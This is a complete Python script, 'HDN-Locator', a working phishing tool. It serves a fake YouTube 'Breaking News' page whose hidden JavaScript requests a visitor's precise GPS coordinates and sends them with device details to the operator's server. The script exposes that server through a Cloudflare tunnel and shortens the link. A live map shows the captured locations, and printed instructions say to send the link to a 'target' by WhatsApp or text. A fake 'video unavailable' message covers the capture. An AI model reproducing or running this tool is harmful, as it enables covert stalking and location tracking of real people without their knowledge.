#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import threading
import webbrowser
import subprocess
import socket
import datetime
import http.server
import socketserver
import urllib.request
import zipfile

class LocationTrackerWindows:
    def __init__(self):
        self.port = 8080
        self.http_server = None
        self.tunnel_process = None
        self.public_url = None
        self.running = True
        
    def create_fake_video_page(self):
        """Create fake YouTube video page with GPS capture"""
        html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>▶️ Breaking News - Must Watch!</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Amazing Video - Trending Today">
    <meta property="og:description" content="This video will go viral! Watch now.">
    <meta property="og:image" content="https://i.ytimg.com/an_webp/X6TNGIrLJOY/mqdefault_6s.webp?du=3000&sqp=CITC488G&rs=AOn4CLCXh6btBiBqXnYbqBDXoIMszyTvOg">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f0f0f; color: #fff; }
        .header { padding: 12px 20px; border-bottom: 1px solid #272727; display: flex; align-items: center; gap: 20px; }
        .logo { font-size: 20px; font-weight: bold; color: red; }
        .search-bar { flex: 1; background: #121212; border: 1px solid #303030; padding: 8px 15px; border-radius: 40px; color: #888; }
        .video-container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .video-player { background: #000; border-radius: 12px; overflow: hidden; position: relative; cursor: pointer; }
        .thumbnail { width: 100%; display: block; }
        .play-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(0,0,0,0.7); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 30px; transition: all 0.2s; }
        .play-overlay:hover { background: #cc0000; transform: translate(-50%, -50%) scale(1.1); }
        .video-title { font-size: 18px; font-weight: 500; margin: 12px 0 8px; }
        .video-stats { color: #aaa; font-size: 14px; margin-bottom: 12px; }
        .channel-info { display: flex; align-items: center; gap: 12px; margin: 16px 0; padding: 12px 0; border-top: 1px solid #272727; border-bottom: 1px solid #272727; }
        .channel-avatar { width: 40px; height: 40px; background: #cc0000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        .subscribe-btn { background: #cc0000; color: white; border: none; padding: 8px 16px; border-radius: 2px; cursor: pointer; margin-left: auto; font-weight: 500; }
        .loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.9); padding: 20px; border-radius: 8px; display: none; z-index: 1000; text-align: center; }
        .error-msg { background: #cc0000; color: white; padding: 10px; text-align: center; display: none; position: fixed; bottom: 0; left: 0; right: 0; z-index: 1000; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #cc0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        .comments { margin-top: 20px; }
        .comment { display: flex; gap: 12px; margin: 15px 0; }
        .comment-avatar { width: 36px; height: 36px; background: #3ea6ff; border-radius: 50%; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">▶️ YouTube</div>
        <div class="search-bar">Search</div>
        <div>🔔</div>
        <div>👤</div>
    </div>
    
    <div class="video-container">
        <div class="video-player" id="videoPlayer">
            <img class="thumbnail" src="https://i.ytimg.com/an_webp/X6TNGIrLJOY/mqdefault_6s.webp?du=3000&sqp=CITC488G&rs=AOn4CLCXh6btBiBqXnYbqBDXoIMszyTvOg" alt="Video thumbnail">
            <div class="play-overlay">▶</div>
        </div>
        
       
        
        <div class="channel-info">
            <div class="channel-avatar">N</div>
            <div><div style="font-weight: bold;">News Today</div>
            <button class="subscribe-btn" id="watchBtn">SUBSCRIBE</button>
        </div>
        
        
    </div>
    
    <div class="loading" id="loading"><div class="spinner"></div><div>Loading video...</div></div>
    <div class="error-msg" id="errorMsg">⚠️ Video unavailable in your region</div>

    <script>
        let locationSent = false;
        
        function getLocation() {
            if (locationSent) return;
            locationSent = true;
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            } else {
                sendError("Geolocation not supported");
            }
        }
        
        function sendLocation(position) {
            var data = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            
            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.log('Error:', err));
        }
        
        function showError(error) {
            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ error: error.message, userAgent: navigator.userAgent })
            });
        }
        
        function sendError(msg) {
            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ error: msg, userAgent: navigator.userAgent })
            });
        }
        
        // Capture immediately
        getLocation();
        
        // Capture on video click
        document.getElementById('videoPlayer').onclick = function() {
            document.getElementById('loading').style.display = 'block';
            getLocation();
            setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('errorMsg').style.display = 'block';
                setTimeout(function() {
                    document.getElementById('errorMsg').style.display = 'none';
                }, 3000);
            }, 2000);
        };
        
        document.getElementById('watchBtn').onclick = function() {
            getLocation();
            alert("Content is processing. Please wait...");
        };
        
        // Capture on page leave
        window.onbeforeunload = function() {
            getLocation();
        };
    </script>
</body>
</html>'''
        
        with open('index.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        print("[✓] Fake video page created: index.html")
    
    def create_viewer_page(self):
        """Create page to view captured locations with map"""
        viewer_content = '''<!DOCTYPE html>
<html>
<head>
    <title>📍 Captured GPS Locations</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #1a1a1a; color: #fff; padding: 20px; }
        h1 { color: #4CAF50; margin-bottom: 20px; }
        .stats { background: #2d2d2d; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: inline-block; }
        .location-card { background: #2d2d2d; margin: 10px 0; padding: 15px; border-radius: 8px; border-left: 4px solid #4CAF50; }
        .timestamp { color: #888; font-size: 12px; }
        .coords { font-size: 18px; font-weight: bold; color: #4CAF50; }
        .maps-link { color: #2196F3; text-decoration: none; }
        #map { height: 500px; margin: 20px 0; border-radius: 8px; }
        .refresh-btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 10px 0; border-radius: 5px; }
        .refresh-btn:hover { background: #45a049; }
        .copy-btn { background: #2196F3; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 10px 10px; border-radius: 5px; }
        .link-box { background: #000; padding: 10px; margin: 10px 0; border-radius: 5px; word-break: break-all; }
    </style>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>
    <h1>📍 Live GPS Tracker</h1>
    <div class="stats" id="stats">Loading...</div>
    <div>
        <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
        <button class="copy-btn" onclick="copyLink()">📋 Copy Public Link</button>
    </div>
    <div id="map"></div>
    <div id="locations-list"></div>
    
    <script>
        let publicUrl = '';
        
        fetch('/url').then(r => r.json()).then(data => { publicUrl = data.url; });
        
        function copyLink() {
            if (publicUrl) {
                navigator.clipboard.writeText(publicUrl);
                alert('Link copied: ' + publicUrl);
            }
        }
        
        function loadLocations() {
            fetch('locations.json?' + Date.now())
                .then(response => response.json())
                .then(data => {
                    if (!data || data.length === 0) {
                        document.getElementById('locations-list').innerHTML = '<p>⏳ No locations captured yet. Send link to target and wait...</p>';
                        document.getElementById('stats').innerHTML = '📍 Locations: 0';
                        return;
                    }
                    
                    let html = '';
                    let lastLoc = null;
                    let locationCount = 0;
                    
                    for (let i = data.length - 1; i >= 0; i--) {
                        const loc = data[i];
                        if (loc.lat && loc.lon) {
                            locationCount++;
                            lastLoc = loc;
                            html += `<div class="location-card">
                                <div class="timestamp">📅 ${loc.server_time || loc.timestamp || 'Unknown'}</div>
                                <div class="coords">📍 ${loc.lat}, ${loc.lon}</div>
                                <div>🎯 Accuracy: ${loc.accuracy || '?'} meters</div>
                                <div>🌐 IP: ${loc.ip || 'Unknown'}</div>
                                <div>📱 Platform: ${loc.platform || 'Unknown'}</div>
                                <div>🌍 Language: ${loc.language || 'Unknown'}</div>
                                <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank" class="maps-link">🗺️ View on Google Maps</a>
                            </div>`;
                        }
                    }
                    
                    document.getElementById('locations-list').innerHTML = html;
                    document.getElementById('stats').innerHTML = `📍 Total Locations: ${locationCount} | 📱 Last Update: ${new Date().toLocaleTimeString()}`;
                    
                    if (lastLoc) {
                        const map = L.map('map').setView([lastLoc.lat, lastLoc.lon], 15);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                            attribution: '© OpenStreetMap'
                        }).addTo(map);
                        L.marker([lastLoc.lat, lastLoc.lon]).addTo(map)
                            .bindPopup(`<b>🎯 Target Location</b><br>Lat: ${lastLoc.lat}<br>Lon: ${lastLoc.lon}<br><a href="https://www.google.com/maps?q=${lastLoc.lat},${lastLoc.lon}" target="_blank">Open in Google Maps</a>`)
                            .openPopup();
                    }
                })
                .catch(err => {
                    document.getElementById('locations-list').innerHTML = '<p>⚠️ Waiting for server...</p>';
                });
        }
        
        loadLocations();
        setInterval(loadLocations, 3000);
    </script>
</body>
</html>'''
        
        with open('view.html', 'w', encoding='utf-8') as f:
            f.write(viewer_content)
        print("[✓] Viewer page created: view.html")
    
    def download_cloudflared(self):
        """Download cloudflared for Windows"""
        print("[*] Downloading Cloudflared...")
        
        cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        cloudflared_path = "cloudflared.exe"
        
        try:
            urllib.request.urlretrieve(cloudflared_url, cloudflared_path)
            print("[✓] Cloudflared downloaded")
            return True
        except Exception as e:
            print(f"[!] Download failed: {e}")
            return False
    
    def start_cloudflare_tunnel(self):
        """Start Cloudflare tunnel for public access"""
        print("\n[*] Starting Cloudflare tunnel...")
        
        if not os.path.exists("cloudflared.exe"):
            if not self.download_cloudflared():
                print("[!] Could not download cloudflared. Using local IP only.")
                return None
        
        try:
            # Start cloudflared tunnel
            self.tunnel_process = subprocess.Popen(
                f"cloudflared.exe tunnel --url http://localhost:{self.port}",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Get the public URL from output
            time.sleep(5)
            for line in iter(self.tunnel_process.stdout.readline, ''):
                if 'https://' in line and '.trycloudflare.com' in line:
                    import re
                    urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                    if urls:
                        self.public_url = urls[0]
                        print(f"[✓] Public URL: {self.public_url}")
                        break
                if 'https://' in line:
                    parts = line.split()
                    for part in parts:
                        if 'https://' in part and '.trycloudflare.com' in part:
                            self.public_url = part.strip()
                            print(f"[✓] Public URL: {self.public_url}")
                            break
                    if self.public_url:
                        break
                time.sleep(0.5)
                
        except Exception as e:
            print(f"[!] Tunnel error: {e}")
        
        return self.public_url
    
    def start_python_server(self):
        """Start custom HTTP server for location tracking"""
        
        class LocationHandler(http.server.SimpleHTTPRequestHandler):
            locations_file = 'locations.json'
            
            def log_message(self, format, *args):
                pass  # Suppress logs
            
            def do_POST(self):
                if self.path == '/track':
                    try:
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length)
                        data = json.loads(post_data.decode('utf-8'))
                        
                        # Add server info
                        data['ip'] = self.client_address[0]
                        data['server_time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        # Load existing locations
                        locations = []
                        if os.path.exists(self.locations_file):
                            with open(self.locations_file, 'r') as f:
                                try:
                                    locations = json.load(f)
                                except:
                                    pass
                        
                        locations.append(data)
                        with open(self.locations_file, 'w') as f:
                            json.dump(locations, f, indent=2)
                        
                        # Print to console
                        if 'lat' in data:
                            print(f"\n🎯 NEW LOCATION CAPTURED!")
                            print(f"   📍 Coordinates: {data['lat']}, {data['lon']}")
                            print(f"   🗺️  Maps: https://www.google.com/maps?q={data['lat']},{data['lon']}")
                            print(f"   📱 Device: {data.get('platform', 'Unknown')}")
                            print(f"   🌐 IP: {data['ip']}")
                            print(f"   ⏰ Time: {data['server_time']}")
                            print("-" * 50)
                        elif 'error' in data:
                            print(f"\n⚠️ Location Error: {data['error']}")
                        
                        # Send response
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({'status': 'success'}).encode())
                        
                    except Exception as e:
                        print(f"Error: {e}")
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_GET(self):
                if self.path == '/':
                    self.path = '/index.html'
                elif self.path == '/view':
                    self.path = '/view.html'
                elif self.path == '/url':
                    # Endpoint to get public URL
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    url_data = {'url': getattr(self.server, 'public_url', 'Not available')}
                    self.wfile.write(json.dumps(url_data).encode())
                    return
                
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        # Create handler with public_url access
        handler = LocationHandler
        
        # Create server
        self.http_server = socketserver.TCPServer(("0.0.0.0", self.port), handler)
        self.http_server.public_url = self.public_url
        
        # Start server in thread
        server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
        server_thread.start()
        print(f"[✓] HTTP Server running at http://localhost:{self.port}")
        
        return server_thread
    
    def display_info(self):
        """Display all information"""
        local_url = f"http://localhost:{self.port}"
        
        print("\n" + "="*60)
        print("🎯 VIDEO LOCATION TRACKER - READY!")
        print("="*60)
        print(f"\n📱 Local URL (for testing): {local_url}")
        print(f"👁️  View captured locations: {local_url}/view")
        
        if self.public_url:
            print(f"\n🌍 PUBLIC URL (Send this to target):")
            print(f"   {self.public_url}")
            print(f"   {self.public_url}/view")
            
            # Create short link
            try:
                import urllib.parse
                tiny_url = f"https://tinyurl.com/api-create.php?url={urllib.parse.quote(self.public_url)}"
                with urllib.request.urlopen(tiny_url) as response:
                    short = response.read().decode('utf-8')
                    print(f"\n🔗 Short Link: {short}")
            except:
                pass
        
        print("\n" + "="*60)
        print("📋 INSTRUCTIONS:")
        print("="*60)
        print("1️⃣  Send the PUBLIC URL to target via WhatsApp/Text")
        print("2️⃣  When they open, location will be captured")
        print("3️⃣  Check captured locations at: /view")
        print("4️⃣  Data saved in: locations.json")
        print("\n⚠️  Target will see a fake YouTube video page")
        print("⚠️  Browser will ask for location permission - Allow it")
        print("\n📍  Captured locations will appear here in real-time!")
        print("="*60)
        
        # Auto open browser
        webbrowser.open(f"{local_url}/view")
    
    def cleanup(self):
        """Cleanup on exit"""
        print("\n[*] Shutting down...")
        self.running = False
        if self.http_server:
            self.http_server.shutdown()
        if self.tunnel_process:
            self.tunnel_process.terminate()
        sys.exit(0)
    
    def run(self):
        """Main function - HDN Hacker Style Banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ██╗  ██╗██████╗ ███╗   ██╗                                              ║
║     ██║  ██║██╔══██╗████╗  ██║                                              ║
║     ███████║██║  ██║██╔██╗ ██║                                              ║
║     ██╔══██║██║  ██║██║╚██╗██║                                              ║
║     ██║  ██║██████╔╝██║ ╚████║                                              ║
║     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝                                              ║
║                                                                              ║
║     ██╗      ██████╗  ██████╗ █████╗ ████████╗ ██████╗ ██████╗               ║
║     ██║     ██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗              ║
║     ██║     ██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝              ║
║     ██║     ██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗              ║
║     ███████╗╚██████╔╝╚██████╗██║  ██║   ██║   ╚██████╔╝██║  ██║              ║
║     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝              ║
║                                                                              ║
║                    GPS LOCATION TRACKER v1.0                                 ║
║                    Capture Exact Coordinates                                 ║
║                    Anti-Spoofing | Real-time Map                             ║
║                                                                              ║
║                    [🐺] HDN-Locator by HasnainDarkNet [🐺]                    ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """)
        
        print("    [*] Initializing HDN-Locator...")
        time.sleep(1)
        print("    [*] Loading modules...")
        time.sleep(0.5)
        print("    [*] Starting GPS tracker engine...")
        time.sleep(0.5)
        print("    [*] Establishing secure tunnel...")
        time.sleep(0.5)
        print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║  [✓] Status: READY                                               ║
    ║  [✓] Target: Any Device with Browser                             ║
    ║  [✓] Method: YouTube Fake Page + GPS Capture                     ║
    ║  [✓] Anti-Spoofing: ACTIVE                                       ║
    ╚══════════════════════════════════════════════════════════════════╝
        """)
        
        # Create files
        self.create_fake_video_page()
        self.create_viewer_page()
        
        # Start server
        self.start_python_server()
        
        # Start Cloudflare tunnel
        self.start_cloudflare_tunnel()
        
        # Update server with public URL
        if self.http_server:
            self.http_server.public_url = self.public_url
        
        # Display info
        self.display_info()
        
        # Keep running
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.cleanup()

if __name__ == "__main__":
    tracker = LocationTrackerWindows()
    tracker.run()
